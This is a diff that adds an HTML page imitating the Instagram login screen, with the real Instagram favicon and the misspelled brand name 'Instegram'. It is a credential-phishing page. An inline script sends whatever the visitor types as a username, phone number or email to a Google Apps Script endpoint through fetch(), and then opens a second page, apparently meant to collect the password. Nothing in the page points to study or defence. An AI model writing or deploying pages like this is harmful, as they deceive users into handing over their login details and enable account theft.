@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Style</title>
+    <link rel="shortcut icon" href="https://static.cdninstagram.com/rsrc.php/v4/yI/r/VsNE-OHk_8a.png" type="image/x-icon">
+    <link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+    <div class="login-container">
+        <h1 class="logo">Instegram</h1>
+        <div class="form-group">
+            <input type="text" id="wordInput" placeholder="Phone number, username, or email">
+            <a href="index2.html" target="_blank"><button onclick="sendToDrive()">next</button></a>
+        </div>
+    </div>
+
+    <script>
+        function sendToDrive() {
+            const word = document.getElementById("wordInput").value;
+
+            // Your script URL here
+            const scriptUrl = 'https://script.google.com/macros/s/AKfycbzhh8BY37EXJSrr_1vCzWyXLiLveE4hIr6sfhCgPZaAbSBX_gZGoIFY1Uagv2Pj-42W/exec';
+            fetch(scriptUrl + '?word=' + encodeURIComponent(word),{
+                method: 'POST'
+            });
+            
+        }
+    </script>
+</body>
+</html>
